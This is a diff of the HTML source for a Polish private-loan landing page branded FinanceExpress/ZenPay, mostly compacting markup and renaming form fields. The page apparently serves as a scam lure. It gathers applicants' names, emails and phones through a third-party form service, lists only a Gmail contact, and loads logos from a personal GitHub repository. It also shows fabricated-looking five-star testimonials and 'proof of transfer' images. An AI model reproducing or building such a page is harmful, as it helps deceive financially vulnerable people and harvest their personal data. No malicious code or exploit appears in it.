@@ -33,30 +33,15 @@
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html { scroll-behavior: smooth; }
-        body {
-            font-family: var(--font-primary);
-            color: var(--gray-700);
-            line-height: 1.6;
-            background-color: var(--white);
-            overflow-x: hidden;
-        }
+        body { font-family: var(--font-primary); color: var(--gray-700); line-height: 1.6; background-color: var(--white); overflow-x: hidden; }
        .container { width: 100%; max-width: 1280px; margin: 0 auto; padding: 0 24px; }
         section { padding: 100px 0; overflow: hidden; }
         h1, h2, h3 { font-family: var(--font-display); font-weight: 800; line-height: 1.2; color: var(--gray-900); }
-       .header {
-            position: fixed; top: 0; left: 0; width: 100%; z-index: 1000;
-            background-color: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px);
-            border-bottom: 1px solid var(--gray-200); transition: var(--transition);
-        }
+       .header { position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; background-color: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); border-bottom: 1px solid var(--gray-200); transition: var(--transition); }
        .navbar { display: flex; justify-content: space-between; align-items: center; height: 80px; }
        .nav-logo { font-size: 1.75rem; font-weight: 800; color: var(--primary); text-decoration: none; display: flex; align-items: center; gap: 10px; }
        .nav-logo i { color: var(--secondary); }
-       .logo-img-header {
-            height: 45px;
-            width: auto;
-            border-radius: 8px;
-            transition: opacity 0.8s ease-in-out;
-        }
+       .logo-img-header { height: 45px; width: auto; border-radius: 8px; transition: opacity 0.8s ease-in-out; }
        .nav-menu { display: flex; align-items: center; gap: 40px; list-style: none; }
        .nav-link { font-weight: 600; color: var(--gray-700); text-decoration: none; transition: var(--transition); }
        .nav-link:hover { color: var(--accent); }
@@ -66,24 +51,8 @@
        .btn-lg { padding: 18px 36px; font-size: 1.1rem; }
        .hamburger { display: none; cursor: pointer; }
        .bar { display: block; width: 25px; height: 3px; margin: 5px auto; background-color: var(--gray-900); transition: all 0.3s ease-in-out; }
-       .hero {
-            padding-top: 180px;
-            padding-bottom: 120px;
-            background-color: var(--gray-100);
-            position: relative;
-            background-image: url('IMG_20260605_230701_978.png');
-            background-size: cover;
-            background-position: center;
-        }
-       .hero::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(15, 23, 42, 0.75);
-        }
+       .hero { padding-top: 180px; padding-bottom: 120px; background-color: var(--gray-100); position: relative; background-image: url('IMG_20260605_230701_978.png'); background-size: cover; background-position: center; }
+       .hero::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.75); }
        .hero-container { display: grid; grid-template-columns: 1fr 1fr; align-items: center; gap: 60px; position: relative; z-index: 2; }
        .hero-badge { display: inline-block; background-color: var(--secondary); color: var(--primary); padding: 8px 16px; border-radius: 50px; font-weight: 700; margin-bottom: 24px; }
        .hero-title { font-size: 3.8rem; margin-bottom: 24px; color: var(--white); }
@@ -114,11 +83,7 @@
        .feature-card:hover { transform: translateY(-10px); background: #334155; }
        .feature-icon { font-size: 2.5rem; color: var(--secondary); margin-bottom: 20px; }
        .feature-card h3 { font-size: 1.3rem; margin-bottom: 12px; }
-       .testimonials-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-        }
+       .testimonials-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; }
        .testimonial-card { background: var(--gray-100); padding: 30px; border-radius: var(--radius-2xl); border: 1px solid var(--gray-200); }
        .testimonial-header { display: flex; align-items: center; margin-bottom: 20px; }
        .testimonial-avatar { width: 50px; height: 50px; border-radius: 50%; margin-right: 15px; object-fit: cover; }
@@ -180,20 +145,13 @@
                     <li class="nav-item"><a href="#dlaczego-my" class="nav-link">Dlaczego my</a></li>
                     <li class="nav-item"><a href="#opinie" class="nav-link">Opinie</a></li>
                     <li class="nav-item"><a href="#faq" class="nav-link">FAQ</a></li>
-                    <li class="nav-item">
-                        <img src="IMG_20260605_235014_385.png" alt="Logo partenaire" class="logo-img-header">
-                    </li>
+                    <li class="nav-item"><img src="IMG_20260605_235014_385.png" alt="Logo partenaire" class="logo-img-header"></li>
                     <li class="nav-item"><a href="#wniosek" class="btn btn-primary">Złóż wniosek</a></li>
                 </ul>
-                <div class="hamburger">
-                    <span class="bar"></span>
-                    <span class="bar"></span>
-                    <span class="bar"></span>
-                </div>
+                <div class="hamburger"><span class="bar"></span><span class="bar"></span><span class="bar"></span></div>
             </nav>
         </div>
     </header>
-
     <main>
         <section class="hero" id="wniosek">
             <div class="container hero-container">
@@ -214,321 +172,98 @@
                         <input type="hidden" name="access_key" value="65819dc2-b965-4f78-9c39-e284be207cf6">
                         <input type="hidden" name="subject" value="NOWY WNIOSEK - FinanceExpress">
                         <input type="hidden" name="redirect" value="https://pozyczka-prywatna.getzenpay.com/dziekuje.html">
-
                         <div class="form-grid">
-                            <div class="form-group">
-                                <label>Imię *</label>
-                                <input type="text" name="Imię" required placeholder="Jan">
-                            </div>
-                            <div class="form-group">
-                                <label>Nazwisko *</label>
-                                <input type="text" name="Nazwisko" required placeholder="Kowalski">
-                            </div>
+                            <div class="form-group"><label>Imię *</label><input type="text" name="Imie" required placeholder="Jan"></div>
+                            <div class="form-group"><label>Nazwisko *</label><input type="text" name="Nazwisko" required placeholder="Kowalski"></div>
                         </div>
-
                         <div class="form-grid">
-                            <div class="form-group">
-                                <label>E-mail *</label>
-                                <input type="email" name="E-mail klienta" required placeholder="jan@email.pl">
-                            </div>
-                            <div class="form-group">
-                                <label>Telefon *</label>
-                                <input type="tel" name="Telefon" required placeholder="+48 500 600 700">
-                            </div>
+                            <div class="form-group"><label>E-mail *</label><input type="email" name="Email" required placeholder="jan@email.pl"></div>
+                            <div class="form-group"><label>Telefon *</label><input type="tel" name="Telefon" required placeholder="+48 500 600 700"></div>
                         </div>
-
                         <div class="form-grid">
-                            <div class="form-group">
-                                <label>Kwota pożyczki (zł) *</label>
-                                <input type="number" name="Kwota" min="3000" required placeholder="15000">
-                            </div>
-                            <div class="form-group">
-                                <label>Okres spłaty *</label>
-                                <select name="Okres spłaty" required>
-                                    <option value="">Wybierz okres</option>
-                                    <option>6 miesięcy</option>
-                                    <option>12 miesięcy</option>
-                                    <option>24 miesiące</option>
-                                    <option>36 miesięcy</option>
-                                    <option>60 miesięcy</option>
-                                    <option>120 miesięcy</option>
-                                </select>
-                            </div>
+                            <div class="form-group"><label>Kwota pożyczki (zł) *</label><input type="number" name="Kwota" min="3000" required placeholder="15000"></div>
+                            <div class="form-group"><label>Okres spłaty *</label><select name="Okres_splaty" required><option value="">Wybierz okres</option><option>6 miesięcy</option><option>12 miesięcy</option><option>24 miesiące</option><option>36 miesięcy</option><option>60 miesięcy</option><option>120 miesięcy</option></select></div>
                         </div>
-
-                        <div class="form-group">
-                            <label>Rodzaj pożyczki *</label>
-                            <select name="Rodzaj pożyczki" required>
-                                <option value="">Wybierz rodzaj</option>
-                                <option>Pożyczka gotówkowa</option>
-                                <option>Pożyczka hipoteczna</option>
-                                <option>Kredyt samochodowy</option>
-                                <option>Pożyczka firmowa</option>
-                            </select>
-                        </div>
-
-                        <div class="form-group">
-                            <label>Cel pożyczki</label>
-                            <textarea name="Cel pożyczki" rows="3" placeholder="Np. remont, wakacje..."></textarea>
-                        </div>
-
-                        <div class="form-group">
-                            <label style="display:flex; align-items:start; gap:10px; font-weight:400; font-size:0.9rem;">
-                                <input type="checkbox" name="Zgoda RODO" value="Tak" required style="width:auto; margin-top:3px;">
-                                <span>Akceptuję regulamin i wyrażam zgodę na przetwarzanie danych osobowych. *</span>
-                            </label>
-                        </div>
-
-                        <button type="submit" class="btn-submit btn btn-primary btn-lg">
-                            <i class="fas fa-paper-plane"></i> Wyślij wniosek
-                        </button>
+                        <div class="form-group"><label>Rodzaj pożyczki *</label><select name="Rodzaj_pozyczki" required><option value="">Wybierz rodzaj</option><option>Pożyczka gotówkowa</option><option>Pożyczka hipoteczna</option><option>Kredyt samochodowy</option><option>Pożyczka firmowa</option></select></div>
+                        <div class="form-group"><label>Cel pożyczki</label><textarea name="Cel_pozyczki" rows="3" placeholder="Np. remont, wakacje..."></textarea></div>
+                        <div class="form-group"><label style="display:flex; align-items:start; gap:10px; font-weight:400; font-size:0.9rem;"><input type="checkbox" name="Zgoda_RODO" value="Tak" required style="width:auto; margin-top:3px;"><span>Akceptuję regulamin i wyrażam zgodę na przetwarzanie danych osobowych. *</span></label></div>
+                        <button type="submit" class="btn-submit btn btn-primary btn-lg"><i class="fas fa-paper-plane"></i> Wyślij wniosek</button>
                     </form>
                 </div>
             </div>
         </section>
-
         <section id="jak-to-dziala">
             <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">Otrzymaj pieniądze w 3 prostych krokach</h2>
-                    <p class="section-subtitle">Nasz proces jest maksymalnie uproszczony, abyś mógł szybko otrzymać potrzebne środki.</p>
-                </div>
+                <div class="section-header"><h2 class="section-title">Otrzymaj pieniądze w 3 prostych krokach</h2><p class="section-subtitle">Nasz proces jest maksymalnie uproszczony, abyś mógł szybko otrzymać potrzebne środki.</p></div>
                 <div class="steps-grid">
-                    <div class="step-card">
-                        <div class="step-number">1</div>
-                        <h3>Wypełnij wniosek</h3>
-                        <p>Zajmie Ci to mniej niż 5 minut. Podaj podstawowe dane i kwotę, której potrzebujesz.</p>
-                    </div>
-                    <div class="step-card">
-                        <div class="step-number">2</div>
-                        <h3>Otrzymaj decyzję</h3>
-                        <p>Nasz system automatycznie przeanalizuje Twój wniosek i w 15 minut otrzymasz decyzję.</p>
-                    </div>
-                    <div class="step-card">
-                        <div class="step-number">3</div>
-                        <h3>Dostaniesz przelew</h3>
-                        <p>Po akceptacji umowy, pieniądze trafią na Twoje konto nawet w ciągu kilku godzin.</p>
-                    </div>
+                    <div class="step-card"><div class="step-number">1</div><h3>Wypełnij wniosek</h3><p>Zajmie Ci to mniej niż 5 minut. Podaj podstawowe dane i kwotę, której potrzebujesz.</p></div>
+                    <div class="step-card"><div class="step-number">2</div><h3>Otrzymaj decyzję</h3><p>Nasz system automatycznie przeanalizuje Twój wniosek i w 15 minut otrzymasz decyzję.</p></div>
+                    <div class="step-card"><div class="step-number">3</div><h3>Dostaniesz przelew</h3><p>Po akceptacji umowy, pieniądze trafią na Twoje konto nawet w ciągu kilku godzin.</p></div>
                 </div>
             </div>
         </section>
-
         <section class="features" id="dlaczego-my">
             <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">Dlaczego warto nam zaufać?</h2>
-                    <p class="section-subtitle">Jesteśmy liderem na rynku pożyczek prywatnych online w Polsce.</p>
-                </div>
+                <div class="section-header"><h2 class="section-title">Dlaczego warto nam zaufać?</h2><p class="section-subtitle">Jesteśmy liderem na rynku pożyczek prywatnych online w Polsce.</p></div>
                 <div class="features-grid">
-                    <div class="feature-card">
-                        <div class="feature-icon"><i class="fas fa-bolt"></i></div>
-                        <h3>Błyskawiczna decyzja</h3>
-                        <p>Nie czekaj tygodniami. U nas decyzję o przyznaniu pożyczki otrzymasz w 15 minut.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon"><i class="fas fa-file-signature"></i></div>
-                        <h3>Minimum formalności</h3>
-                        <p>Zapomnij o stosach dokumentów. Cały proces odbywa się online, bez wychodzenia z domu.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon"><i class="fas fa-hand-holding-dollar"></i></div>
-                        <h3>Elastyczne warunki</h3>
-                        <p>Sam decydujesz o kwocie i okresie spłaty. Dopasujemy ofertę do Twoich możliwości.</p>
-                    </div>
+                    <div class="feature-card"><div class="feature-icon"><i class="fas fa-bolt"></i></div><h3>Błyskawiczna decyzja</h3><p>Nie czekaj tygodniami. U nas decyzję o przyznaniu pożyczki otrzymasz w 15 minut.</p></div>
+                    <div class="feature-card"><div class="feature-icon"><i class="fas fa-file-signature"></i></div><h3>Minimum formalności</h3><p>Zapomnij o stosach dokumentów. Cały proces odbywa się online, bez wychodzenia z domu.</p></div>
+                    <div class="feature-card"><div class="feature-icon"><i class="fas fa-hand-holding-dollar"></i></div><h3>Elastyczne warunki</h3><p>Sam decydujesz o kwocie i okresie spłaty. Dopasujemy ofertę do Twoich możliwości.</p></div>
                 </div>
             </div>
         </section>
-
         <section id="opinie">
             <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">Co mówią nasi klienci</h2>
-                    <p class="section-subtitle">Zaufały nam już tysiące Polaków w całej Polsce.</p>
-                </div>
+                <div class="section-header"><h2 class="section-title">Co mówią nasi klienci</h2><p class="section-subtitle">Zaufały nam już tysiące Polaków w całej Polsce.</p></div>
                 <div class="testimonials-grid">
-                    <div class="testimonial-card">
-                        <div class="testimonial-header">
-                            <img src="https://i.pravatar.cc/150?img=11" alt="Anna" class="testimonial-avatar">
-                            <div>
-                                <div class="testimonial-author">Anna Kowalska <span>Warszawa 🇵🇱</span></div>
-                            </div>
-                        </div>
-                        <div class="testimonial-stars">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
-                        <p>"Potrzebowałam 15 000 zł na remont. Wniosek wypełniłam w 3 minuty, a po 12 minutach pieniądze były już na moim koncie dzięki ZenPay. Profesjonalnie i bez zbędnych pytań."</p>
-                        <p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 15 000 zł</p>
-                    </div>
-                    <div class="testimonial-card">
-                        <div class="testimonial-header">
-                            <img src="https://i.pravatar.cc/150?img=12" alt="Piotr" class="testimonial-avatar">
-                            <div>
-                                <div class="testimonial-author">Piotr Nowak <span>Kraków 🇵🇱</span></div>
-                            </div>
-                        </div>
-                        <div class="testimonial-stars">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
-                        <p>"Złożyłem wniosek o 8 500 zł na zakup sprzętu. Decyzja przyszła błyskawicznie, a przelew z ZenPay trafił na konto w 14 minut. Polecam każdemu, kto ceni czas."</p>
-                        <p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 8 500 zł</p>
-                    </div>
-                    <div class="testimonial-card">
-                        <div class="testimonial-header">
-                            <img src="https://i.pravatar.cc/150?img=13" alt="Katarzyna" class="testimonial-avatar">
-                            <div>
-                                <div class="testimonial-author">Katarzyna Wiśniewska <span>Wrocław 🇵🇱</span></div>
-                            </div>
-                        </div>
-                        <div class="testimonial-stars">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
-                        <p>"Potrzebowałam 12 000 zł na wakacje. Wypełniłam formularz, a po 10 minutach miałam pieniądze. ZenPay to rewelacja – szybko, bezpiecznie i bez zbędnych formalności."</p>
-                        <p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 12 000 zł</p>
-                    </div>
-                    <div class="testimonial-card">
-                        <div class="testimonial-header">
-                            <img src="https://i.pravatar.cc/150?img=14" alt="Michał" class="testimonial-avatar">
-                            <div>
-                                <div class="testimonial-author">Michał Zieliński <span>Gdańsk 🇵🇱</span></div>
-                            </div>
-                        </div>
-                        <div class="testimonial-stars">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
-                        <p>"Chciałem sfinansować kurs zawodowy. Kwota 7 200 zł została przelana przez ZenPay w 13 minut. Bardzo przejrzyste warunki i miła obsługa. Gorąco polecam!"</p>
-                        <p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 7 200 zł</p>
-                    </div>
-                    <div class="testimonial-card">
-                        <div class="testimonial-header">
-                            <img src="https://i.pravatar.cc/150?img=15" alt="Magdalena" class="testimonial-avatar">
-                            <div>
-                                <div class="testimonial-author">Magdalena Kamińska <span>Poznań 🇵🇱</span></div>
-                            </div>
-                        </div>
-                        <div class="testimonial-stars">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
-                        <p>"Potrzebowałam 10 000 zł na niespodziewany wydatek. Dzięki ZenPay pieniądze były na koncie w 11 minut. Cały proces online, bez wychodzenia z domu – rewelacja!"</p>
-                        <p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 10 000 zł</p>
-                    </div>
+                    <div class="testimonial-card"><div class="testimonial-header"><img src="https://i.pravatar.cc/150?img=11" alt="Anna" class="testimonial-avatar"><div><div class="testimonial-author">Anna Kowalska <span>Warszawa 🇵🇱</span></div></div></div><div class="testimonial-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"Potrzebowałam 15 000 zł na remont. Wniosek wypełniłam w 3 minuty, a po 12 minutach pieniądze były już na moim koncie dzięki ZenPay. Profesjonalnie i bez zbędnych pytań."</p><p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 15 000 zł</p></div>
+                    <div class="testimonial-card"><div class="testimonial-header"><img src="https://i.pravatar.cc/150?img=12" alt="Piotr" class="testimonial-avatar"><div><div class="testimonial-author">Piotr Nowak <span>Kraków 🇵🇱</span></div></div></div><div class="testimonial-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"Złożyłem wniosek o 8 500 zł na zakup sprzętu. Decyzja przyszła błyskawicznie, a przelew z ZenPay trafił na konto w 14 minut. Polecam każdemu, kto ceni czas."</p><p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 8 500 zł</p></div>
+                    <div class="testimonial-card"><div class="testimonial-header"><img src="https://i.pravatar.cc/150?img=13" alt="Katarzyna" class="testimonial-avatar"><div><div class="testimonial-author">Katarzyna Wiśniewska <span>Wrocław 🇵🇱</span></div></div></div><div class="testimonial-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"Potrzebowałam 12 000 zł na wakacje. Wypełniłam formularz, a po 10 minutach miałam pieniądze. ZenPay to rewelacja – szybko, bezpiecznie i bez zbędnych formalności."</p><p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 12 000 zł</p></div>
+                    <div class="testimonial-card"><div class="testimonial-header"><img src="https://i.pravatar.cc/150?img=14" alt="Michał" class="testimonial-avatar"><div><div class="testimonial-author">Michał Zieliński <span>Gdańsk 🇵🇱</span></div></div></div><div class="testimonial-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"Chciałem sfinansować kurs zawodowy. Kwota 7 200 zł została przelana przez ZenPay w 13 minut. Bardzo przejrzyste warunki i miła obsługa. Gorąco polecam!"</p><p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 7 200 zł</p></div>
+                    <div class="testimonial-card"><div class="testimonial-header"><img src="https://i.pravatar.cc/150?img=15" alt="Magdalena" class="testimonial-avatar"><div><div class="testimonial-author">Magdalena Kamińska <span>Poznań 🇵🇱</span></div></div></div><div class="testimonial-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"Potrzebowałam 10 000 zł na niespodziewany wydatek. Dzięki ZenPay pieniądze były na koncie w 11 minut. Cały proces online, bez wychodzenia z domu – rewelacja!"</p><p style="font-weight:600; color:var(--success); margin-top:10px;">✅ Przelew otrzymany: 10 000 zł</p></div>
                 </div>
             </div>
         </section>
-
         <section class="proof-section">
             <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">Zrealizowane przelewy dla naszych klientów</h2>
-                    <p class="section-subtitle">Pieniądze trafiają na konta w ciągu 24h</p>
-                </div>
-                <div class="proof-images">
-                    <img src="file_0000000001a871fd9aa470aea3ff9416.png" alt="Potwierdzenie przelewu 1">
-                    <img src="file_00000000870072309a90e1c669b171ce.png" alt="Potwierdzenie przelewu 2">
-                </div>
+                <div class="section-header"><h2 class="section-title">Zrealizowane przelewy dla naszych klientów</h2><p class="section-subtitle">Pieniądze trafiają na konta w ciągu 24h</p></div>
+                <div class="proof-images"><img src="file_0000000001a871fd9aa470aea3ff9416.png" alt="Potwierdzenie przelewu 1"><img src="file_00000000870072309a90e1c669b171ce.png" alt="Potwierdzenie przelewu 2"></div>
             </div>
         </section>
-
         <section class="faq" id="faq">
             <div class="container faq-container">
-                <div class="section-header">
-                    <h2 class="section-title">Najczęstsze pytania</h2>
-                </div>
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <span>Kto może ubiegać się o pożyczkę?</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Każda osoba pełnoletnia posiadająca obywatelstwo polskie, ważny dowód osobisty, konto w banku i stały dochód.</p>
-                    </div>
-                </div>
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <span>Jakie dokumenty są potrzebne?</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </div>
-                    <div class="faq-answer">
-                        <p>W większości przypadków wystarczy tylko dowód osobisty. W niektórych sytuacjach możemy poprosić o dokument potwierdzający dochód.</p>
-                    </div>
-                </div>
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <span>Czy mogę spłacić pożyczkę przed terminem?</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Oczywiście! W każdej chwili możesz dokonać wcześniejszej spłaty całości lub części pożyczki bez żadnych dodatkowych prowizji.</p>
-                    </div>
-                </div>
+                <div class="section-header"><h2 class="section-title">Najczęstsze pytania</h2></div>
+                <div class="faq-item"><div class="faq-question"><span>Kto może ubiegać się o pożyczkę?</span><i class="fas fa-chevron-down"></i></div><div class="faq-answer"><p>Każda osoba pełnoletnia posiadająca obywatelstwo polskie, ważny dowód osobisty, konto w banku i stały dochód.</p></div></div>
+                <div class="faq-item"><div class="faq-question"><span>Jakie dokumenty są potrzebne?</span><i class="fas fa-chevron-down"></i></div><div class="faq-answer"><p>W większości przypadków wystarczy tylko dowód osobisty. W niektórych sytuacjach możemy poprosić o dokument potwierdzający dochód.</p></div></div>
+                <div class="faq-item"><div class="faq-question"><span>Czy mogę spłacić pożyczkę przed terminem?</span><i class="fas fa-chevron-down"></i></div><div class="faq-answer"><p>Oczywiście! W każdej chwili możesz dokonać wcześniejszej spłaty całości lub części pożyczki bez żadnych dodatkowych prowizji.</p></div></div>
             </div>
         </section>
     </main>
-
     <footer class="footer">
         <div class="container">
             <div class="footer-grid">
-                <div class="footer-col">
-                    <a href="#" class="nav-logo" style="color: white;"><i class="fas fa-bolt"></i> FinanceExpress</a>
-                    <p style="margin-top: 20px;">Twój zaufany partner finansowy. Szybkie i bezpieczne pożyczki online.</p>
-                </div>
-                <div class="footer-col">
-                    <h4>Nawigacja</h4>
-                    <ul>
-                        <li><a href="#jak-to-dziala">Jak to działa</a></li>
-                        <li><a href="#dlaczego-my">Dlaczego my</a></li>
-                        <li><a href="#opinie">Opinie</a></li>
-                        <li><a href="#faq">FAQ</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h4>Informacje</h4>
-                    <ul>
-                        <li><a href="#">Polityka prywatności</a></li>
-                        <li><a href="#">Regulamin</a></li>
-                        <li><a href="#">Kontakt</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h4>Kontakt</h4>
-                    <ul>
-                        <li><a href="mailto:noreply.kontakt.pl@gmail.com">noreply.kontakt.pl@gmail.com</a></li>
-                        <li><a href="tel:+48123456789"></a></li>
-                    </ul>
-                </div>
+                <div class="footer-col"><a href="#" class="nav-logo" style="color: white;"><i class="fas fa-bolt"></i> FinanceExpress</a><p style="margin-top: 20px;">Twój zaufany partner finansowy. Szybkie i bezpieczne pożyczki online.</p></div>
+                <div class="footer-col"><h4>Nawigacja</h4><ul><li><a href="#jak-to-dziala">Jak to działa</a></li><li><a href="#dlaczego-my">Dlaczego my</a></li><li><a href="#opinie">Opinie</a></li><li><a href="#faq">FAQ</a></li></ul></div>
+                <div class="footer-col"><h4>Informacje</h4><ul><li><a href="#">Polityka prywatności</a></li><li><a href="#">Regulamin</a></li><li><a href="#">Kontakt</a></li></ul></div>
+                <div class="footer-col"><h4>Kontakt</h4><ul><li><a href="mailto:noreply.kontakt.pl@gmail.com">noreply.kontakt.pl@gmail.com</a></li></ul></div>
             </div>
-            <div class="footer-bottom">
-                <p>&copy; 2026 FinanceExpress. Wszelkie prawa zastrzeżone.</p>
-            </div>
+            <div class="footer-bottom"><p>&copy; 2026 FinanceExpress. Wszelkie prawa zastrzeżone.</p></div>
         </div>
     </footer>
-
     <script>
-        // --- Menu burger ---
         const hamburger = document.querySelector(".hamburger");
         const navMenu = document.querySelector(".nav-menu");
-        hamburger.addEventListener("click", () => {
-            hamburger.classList.toggle("active");
-            navMenu.classList.toggle("active");
-        });
-        document.querySelectorAll(".nav-link").forEach(n => n.addEventListener("click", () => {
-            hamburger.classList.remove("active");
-            navMenu.classList.remove("active");
-        }));
-
-        // --- Accordéon FAQ ---
+        hamburger.addEventListener("click", () => { hamburger.classList.toggle("active"); navMenu.classList.toggle("active"); });
+        document.querySelectorAll(".nav-link").forEach(n => n.addEventListener("click", () => { hamburger.classList.remove("active"); navMenu.classList.remove("active"); }));
         const faqItems = document.querySelectorAll(".faq-item");
         faqItems.forEach(item => {
             const question = item.querySelector(".faq-question");
             question.addEventListener("click", () => {
                 const currentlyActive = document.querySelector(".faq-item.active");
-                if (currentlyActive && currentlyActive!== item) {
-                    currentlyActive.classList.remove("active");
-                }
+                if (currentlyActive && currentlyActive!== item) { currentlyActive.classList.remove("active"); }
                 item.classList.toggle("active");
             });
         });
-
-        // --- Rotation des 2 logos toutes les 30 secondes ---
         const logoImages = [
             "https://raw.githubusercontent.com/Monika-sourc/Szybka-po-yczka-prywatna/main/IMG_20260622_082017_961.png",
             "https://raw.githubusercontent.com/Monika-sourc/Szybka-po-yczka-prywatna/main/IMG_20260622_082044_148.png"
@@ -538,14 +273,10 @@
         function changeLogo() {
             currentIndex = (currentIndex + 1) % logoImages.length;
             mainLogo.style.opacity = "0";
-            setTimeout(() => {
-                mainLogo.src = logoImages[currentIndex];
-                mainLogo.style.opacity = "1";
-            }, 400);
+            setTimeout(() => { mainLogo.src = logoImages[currentIndex]; mainLogo.style.opacity = "1"; }, 400);
         }
         setInterval(changeLogo, 30000);
-
-        // --- FIX PAGE DE REMERCIEMENT - GARANTIT LA REDIRECTION ---
+        // FIX PAGE MERCI + ANTI-BUG POLONAIS
         const loanForm = document.getElementById("loan-form");
         loanForm.addEventListener("submit", async (e) => {
             e.preventDefault();
@@ -555,10 +286,7 @@
             btn.disabled = true;
             const formData = new FormData(loanForm);
             try {
-                const res = await fetch("https://api.web3forms.com/submit", {
-                    method: "POST",
-                    body: formData
-                });
+                const res = await fetch("https://api.web3forms.com/submit", { method: "POST", body: formData });
                 const data = await res.json();
                 if(data.success){
                     window.location.href = "https://pozyczka-prywatna.getzenpay.com/dziekuje.html";
